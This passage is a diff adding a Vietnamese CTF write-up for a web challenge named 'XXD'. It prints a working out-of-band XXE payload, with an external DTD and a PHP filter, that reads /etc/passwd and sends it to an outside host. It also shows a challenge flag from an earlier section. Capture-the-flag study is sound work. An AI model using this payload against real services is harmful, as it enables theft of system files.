@@ -178,3 +178,33 @@ sau khi chạy chương trình thì được kết quả là: 0xfd376061
 
 flag: KCSC{0xfd376061}
 
+
+
+# XXD
+WED
+
+## Description:
+> Đường dẫn: http://146.190.115.228:13373/
+
+## Solution:
+sau khi truy cập trang web thì mình nhận được một cái survey, điền đủ thông tin và mình bắt lấy request được như sau:
+
+![img](./images/8.png)
+
+trang web thực hiện post thông tin trong xml, ngoài ra đề bài là XXD nên làm mình liên tưởng tới tấn công XXE.
+sau một hồi tìm trên PayloadAllTheThings thì mình tìm thấy cái có thể khai thác được là : XXE OOB with DTD and PHP filter
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+File stored on http://127.0.0.1/dtd.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+```
